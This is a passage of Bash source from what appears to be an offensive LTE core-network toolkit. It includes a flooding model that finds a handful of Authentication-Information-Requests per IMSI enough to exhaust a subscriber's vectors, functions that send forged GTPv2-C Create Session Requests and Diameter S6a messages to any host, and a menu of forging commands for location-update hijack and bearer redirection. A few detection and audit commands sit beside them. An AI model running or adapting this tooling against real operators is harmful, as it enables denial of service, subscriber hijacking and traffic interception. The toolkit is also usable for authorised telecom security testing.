    [[ "$hss" =~ ^[0-9]+$ && "$mme" =~ ^[0-9]+$ && "$mbps" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--flood-model takes three decimal numbers: HSS AIR/s, MME sessions/s, attacker Mbps\n' >&2; return 2; }
    local cap_air="$hss" cap_sess="$mme" link="$mbps"
    printf 'assumption\thss_air_per_sec\t%s\tone Authentication-Information-Request answered per second by the target HSS at saturation\n' "$cap_air"
    printf 'assumption\tmme_sessions_per_sec\t%s\tone GTPv2 Create Session Request turned into a session per second at saturation\n' "$cap_sess"
    printf 'assumption\tattacker_mbps\t%s\tthe sending capacity being reasoned about\n' "$link"
    printf 'assumption\tvectors_per_subscriber\t5\tTS 33.102 authentication vectors per subscriber, refreshed on use\n'
    printf 'formula\tpps\trequired_pps = saturation_capacity / work_per_message\n'
    printf 'formula\tmbps\trequired_mbps = required_pps * wire_octets_per_message * 8 / 1000000\n'

    # Diameter AIR: 20-octet header, Session-Id/Auth-Session-State/Origin-Host/
    # Origin-Realm/Destination-Realm/User-Name/SIP-Auth-Data-Item(?); 4-octet
    # AVP alignment per RFC 6733 4.1; TCP/IPv4 adds 40 octets.
    local air_avps=250 air_wire=$(( 20 + 250 + 40 ))
    # GTPv2-C CSReq: 8-octet header + IEs (IMSI, MSISDN, RAT, F-TEID, APN,
    # PAA, AMBR, ...) about 140 octets; UDP/IPv4 adds 28.
    local gtpc_wire=$(( 8 + 140 + 28 ))
    local air_pps air_mbps sess_pps sess_mbps
    air_pps=$cap_air
    air_mbps=$(awk -v p="$air_pps" -v b="$air_wire" 'BEGIN{printf "%.3f", p*b*8/1000000}')
    sess_pps=$cap_sess
    sess_mbps=$(awk -v p="$sess_pps" -v b="$gtpc_wire" 'BEGIN{printf "%.3f", p*b*8/1000000}')

    printf 'leg\tdiameter-s6a\tAuthentication-Information-Request\n'
    printf 'leg_wire_octets\tdiameter-s6a\t%s\t20-octet header + ~250 octets of AVPs (4-octet aligned) + 40 octets TCP/IPv4\n' "$air_wire"
    printf 'leg_saturate\tdiameter-s6a\t%s pps\t%s Mbit/s\tcapacity/1 per message\n' "$air_pps" "$air_mbps"
    printf 'leg_fit\tdiameter-s6a\t%s\t%s Mbit/s of the attacker link is %s%% of what saturation needs\n' \
        "$([[ "$(awk -v a="$air_mbps" -v b="$link" 'BEGIN{print (a<=b)?1:0}')" == 1 ]] && echo feasible || echo insufficient)" \
        "$air_mbps" "$(awk -v a="$air_mbps" -v b="$link" 'BEGIN{printf "%.2f", (b>0)?100*a/b:0}')"
    printf 'leg\tgtpv2-c\tCreate Session Request\n'
    printf 'leg_wire_octets\tgtpv2-c\t%s\t8-octet header + ~140 octets of IEs + 28 octets UDP/IPv4\n' "$gtpc_wire"
    printf 'leg_saturate\tgtpv2-c\t%s pps\t%s Mbit/s\tcapacity/1 per message\n' "$sess_pps" "$sess_mbps"
    printf 'leg_fit\tgtpv2-c\t%s\t%s Mbit/s of the attacker link is %s%% of what saturation needs\n' \
        "$([[ "$(awk -v a="$sess_mbps" -v b="$link" 'BEGIN{print (a<=b)?1:0}')" == 1 ]] && echo feasible || echo insufficient)" \
        "$sess_mbps" "$(awk -v a="$sess_mbps" -v b="$link" 'BEGIN{printf "%.2f", (b>0)?100*a/b:0}')"

    printf 'state\tvector_pool\t5 vectors per subscriber: five re-authentications -- five Authentication Information Requests answered -- retire every vector for that IMSI, and the sixth attach cannot complete until the HSS refreshes\n'
    printf 'state\tthis_is_the_depth\t1\tat %s pps the six messages take microseconds, so the bandwidth question never arises for one subscriber; the cost is the state the HSS must recover\n' "$air_pps"
    printf 'state\tsession_table\tone Create Session Request is a session, a TEID pair and a P-GW record: the MME session table (%s/s at saturation) and the P-GW tunnel table are the finite objects, not the link\n' "$cap_sess"
    printf 'state\tteid_space\t2^32 TEIDs is not the limit; the per-APN address pool and the P-GW session store are\n'
    printf 'finding\tbandwidth_is_a_red_herring\tINFO\tthe Mbit/s arithmetic says a 100 Mbit/s sender is not the interesting actor for these legs; state exhaustion needs far less\n'
    printf 'finding\tvector_pool_per_subscriber\tHIGH\tthe HSS vector pool makes a targeted denial of service cost a handful of messages per IMSI and no bandwidth worth measuring\n'
    printf 'finding\tsession_table_shared\tMEDIUM\tGTP session allocation is shared: the attacker does not need the victim IMSI, only the S11 address and a P-GW that allocates before checking\n'
    printf 'detect\tcount AIRs per IMSI and per origin host, and CSR per APN and per source; alert on a per-IMSI rate above two per minute and on any AIR from a host that never attaches\n'
    printf 'verdict\tthe depth of a Diameter or GTP flood is the number of finite objects behind the message, not the bit rate: five vectors per subscriber, one session per request, and the maths says a single laptop is enough\n'
    return 0
}

lcore_cmd_gtpc_send() {
    local host="" port=2123 hex="" wait=0
    while (( $# )); do
        case "$1" in
            --wait) (($# >= 2)) && [[ "${2:-}" =~ ^[0-9]+([.][0-9]+)?$ ]] || {
                        printf 'ERROR\t--wait takes seconds; for UDP a reply is the only proof the message arrived\n' >&2; return 2; }
                    wait="$2"; shift 2 ;;
            --help|-h) printf 'usage: --gtpc-send <host> [port] [hex] [--wait N]\n'; return 0 ;;
            -*)     printf 'ERROR\t--gtpc-send does not take %s\n' "$1" >&2; return 2 ;;
            *)      [[ -n "$1" ]] || { shift; continue; }
                    if [[ -z "$host" ]]; then host="$1"
                    elif [[ "$port" == "2123" && "$1" =~ ^[0-9]+$ ]]; then port="$1"
                    elif [[ -z "$hex" ]]; then hex="$1"
                    else printf 'ERROR\t--gtpc-send takes <host> [port] [hex] [--wait N]\n' >&2; return 2; fi
                    shift ;;
        esac
    done
    local tool="$IMSISTING_ROOT/tools/udp_assoc.py"
    if [[ -z "$host" || "$host" =~ ^[0-9]+$ ]]; then
        printf 'ERROR\tneed <sgw-or-pgw-host> [port] [hex]; a port on its own is not a host\n' >&2
        return 2
    fi
    if [[ ! -f "$tool" ]]; then
        printf 'ERROR\t%s is missing; cannot send\n' "$tool" >&2
        return 1
    fi
    if [[ -z "$hex" ]]; then
        hex=$(lcore_cmd_gtp_csr_forge 310150123456789 internet 310 260 \
              | awk -F'\t' '$1=="message"{print $2; exit}')
        [[ -n "$hex" ]] || { printf 'ERROR\tthe GTP-C builder returned no octets\n' >&2; return 1; }
    fi
    printf 'leg\tGTPv2-C\n'
    printf 'target\t%s:%s\n' "$host" "$port"
    printf 'encapsulation\tudp\n'
    local out rep rc=0
    out=$(timeout 30 python3 "$tool" send "$host" "$port" "$hex" --wait "$wait" 2>&1) || rc=$?
    printf '%s\n' "$out"
    rep=$(printf '%s\n' "$out" | awk -F'\t' '$1=="reply_hex"{print $2}')
    if [[ -n "$rep" ]]; then
        local rm
        rm=$(lcore_gtpc_parse_header "$rep" 2>/dev/null | awk -F'\t' '$1=="message_name"{print $2; exit}')
        local rt
        rt=$(lcore_gtpc_parse_header "$rep" 2>/dev/null | awk -F'\t' '$1=="message_type"{print $2; exit}')
        if [[ -n "$rm" ]]; then
            printf 'reply_decoded\t%s\n' "$rm"
            printf 'reply_type\t%s\n' "$rt"
        else
            printf 'reply_decoded\t%s octets came back and they are not a GTP-C header this tree can read\n' "$(( ${#rep} / 2 ))"
        fi
    elif [[ "$wait" != "0" ]]; then
        printf 'reply_decoded\tnone within %ss\n' "$wait"
    fi
    return "$rc"
}

# Diameter's other leg.  The SCTP path belongs to tools/sctp_assoc.py (it is
# what the small cell's backhaul uses); a Diameter interconnect is just as often
# TCP 3868 behind TLS, and that is this.  Armed for the same reason as the other
# two: the octets build without a network, the socket is a separate decision.
lcore_cmd_diameter_send() {
    local host="" port=3868 hex="" wait=0
    while (( $# )); do
        case "$1" in
            --wait) (($# >= 2)) && [[ "${2:-}" =~ ^[0-9]+([.][0-9]+)?$ ]] || {
                        printf 'ERROR\t--wait takes seconds; an answer is what proves the peer read the request\n' >&2; return 2; }
                    wait="$2"; shift 2 ;;
            --help|-h) printf 'usage: --diameter-send <host> [port] [hex] [--wait N]\n'; return 0 ;;
            -*)     printf 'ERROR\t--diameter-send does not take %s\n' "$1" >&2; return 2 ;;
            *)      [[ -n "$1" ]] || { shift; continue; }
                    if [[ -z "$host" ]]; then host="$1"
                    elif [[ "$port" == "3868" && "$1" =~ ^[0-9]+$ ]]; then port="$1"
                    elif [[ -z "$hex" ]]; then hex="$1"
                    else printf 'ERROR\t--diameter-send takes <host> [port] [hex] [--wait N]\n' >&2; return 2; fi
                    shift ;;
        esac
    done
    local tool="$IMSISTING_ROOT/tools/stream_assoc.py"
    if [[ -z "$host" || "$host" =~ ^[0-9]+$ ]]; then
        printf 'ERROR\tneed <hss-or-dra-host> [port] [hex]; a port on its own is not a host\n' >&2
        return 2
    fi
    [[ -f "$tool" ]] || { printf 'ERROR\t%s is missing; cannot send\n' "$tool" >&2; return 1; }
    if [[ -z "$hex" ]]; then
        hex=$(lcore_cmd_build_ulr 310150123456789 | awk -F'\t' '$1=="hex"{print $2; exit}')
        [[ -n "$hex" ]] || { printf 'ERROR\tthe Diameter builder returned no octets\n' >&2; return 1; }
    fi
    printf 'leg\tDiameter S6a/S6d\n'
    printf 'target\t%s:%s\n' "$host" "$port"
    if [[ "${LTE_DIAMETER_TLS:-0}" == "1" ]]; then
        printf 'encapsulation\ttls\n'
        timeout 30 python3 "$tool" send "$host" "$port" "$hex" --tls \
            ${LTE_DIAMETER_INSECURE:+--insecure} --wait "$wait"
    else
        printf 'encapsulation\ttcp\n'
        printf 'note\tno CER/CEA handshake and no answer matching; this sends and reads\n'
        timeout 30 python3 "$tool" send "$host" "$port" "$hex" --wait "$wait"
    fi
}

lcore_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)    lcore_cli_status_tsv ;;
        --decode-diameter) lcore_cmd_decode_diameter "${1:-}" ;;
        --decode-gtp-c)  lcore_cmd_decode_gtp_c "${1:-}" ;;
        --decode-gtp-u)  lcore_cmd_decode_gtp_u "${1:-}" ;;
        --build-air)     lcore_cmd_build_air "${1:-310150123456789}" ;;
        --build-ulr)     lcore_cmd_build_ulr "${1:-310150123456789}" ;;
        --build-clr)     lcore_cmd_build_clr "${1:-310150123456789}" ;;
        --gtp-csr-forge) lcore_cmd_gtp_csr_forge "${1:-310150123456789}" "${2:-internet}" "${3:-310}" "${4:-260}" ;;
        --gtp-modify-bearer) lcore_cmd_gtp_modify_bearer "${1:-}" "${2:-5}" ;;
        --gtp-in-gtp)    lcore_cmd_gtp_in_gtp "$@" ;;
        --mbms-session)  lcore_cmd_mbms_session "$@" ;;
        --gtpc-send)     lcore_cmd_gtpc_send "$@" ;;
        --flood-model)   lcore_flood_model "${1:-2000}" "${2:-500}" "${3:-100}" ;;
        --diameter-send) lcore_cmd_diameter_send "$@" ;;
        --gtpdoor-detect) lcore_cmd_gtpdoor "${1:-}" ;;
        --cdr-fraud-check) lcore_cmd_cdr_fraud "${1:-}" ;;
        --fs20-audit)    lcore_cmd_fs20 "${1:-}" ;;
        --plan)          lcore_cmd_plan "${1:-}" ;;
        --s1ap)          lcore_s1ap_identity_procedures ;;
        --surface)       lcore_surface_notes ;;
        --require-core)  lcore_require_core ;;
        --selftest)      lcore_selftest ;;
        --menu)          lcore_menu ;;
        *)
            cat >&2 <<EOF
LTE Core (EPC) — Diameter S6a/S6d, GTP-C v2, GTP-U, S1-MME

Usage: $0 COMMAND
  --status-tsv                module state as TSV
  --decode-diameter <hex>     parse a Diameter header and walk its AVPs
  --decode-gtp-c <hex>        parse a GTP-C v2 header and walk its IEs
  --decode-gtp-u <hex>        parse a GTP-U header and its extension chain
  --build-air [IMSI]          build an S6a Authentication-Information-Request
  --build-clr [IMSI]          build an S6a Cancel-Location-Request (317)
  --build-ulr [IMSI]          build an S6a Update-Location-Request
  --gtp-csr-forge [IMSI] [APN] [MCC] [MNC]
                              forge a GTP-C Create Session Request
  --gtp-modify-bearer <TEID> [EBI]
                              forge a GTP-C Modify Bearer (F-TEID redirect)
  --gtp-in-gtp [--outer-teid hex] [--inner-teid hex] [--payload hex]
               [--seq hex] [--outer-seq hex] [--with-ip --src a.b.c.d
               --dst a.b.c.d] [--out path]
                              build a GTPv1-U G-PDU whose payload is another
                              G-PDU (TS 29.281 §5.1): no IP layer unless
                              --with-ip asks for the inner IPv4/UDP 2152
  --mbms-session [--mood] [--teid hex] [--seq hex] [--mcc 310 --mnc 260]
               [--service-id hex6] [--duration secs] [--days n]
               [--area-ids a,b] [--mcd-dist a.b.c.d --mcd-src a.b.c.d]
               [--session-id hex2] [--flow-id hex4] [--out path]
                              build a GTPv2-C MBMS Session Start Request
                              (TS 29.274 §7.13.1, type 231); --mood marks the
                              MBMS-over-Demand (unicast-originated) variant
  --gtpc-send <host> [port] [hex] [--wait N]   send over UDP and read the answer when there is one
                              send the Create Session Request over UDP 2123
                              (no arming needed)
  --flood-model [hss-air/s] [mme-sess/s] [mbps]
                                C6: the flooding depth, with the
                                octet counts and the finite objects
  --diameter-send <host> [port] [hex]
                              send a Diameter message over TCP 3868, or TLS
                              with LTE_DIAMETER_TLS=1
  --gtpdoor-detect <hex>      GTPdoor-class Echo abuse detection
  --cdr-fraud-check <tsv>     CDR overbilling/bypass anomaly
  --fs20-audit <config>       GSMA FS.20 GTP interconnect controls
  --plan <ulr-hijack|gtp-inject|sctp-scan>
                              write a handed-off plan naming the testbed
  --s1ap                      S1AP identity-carrying procedures
  --surface                   attack surface notes
  --require-core              report the EPC testbed, by name if absent
  --selftest                  verify the codecs without a core network
  --menu                      interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    lcore_cli_main "$@"
fi
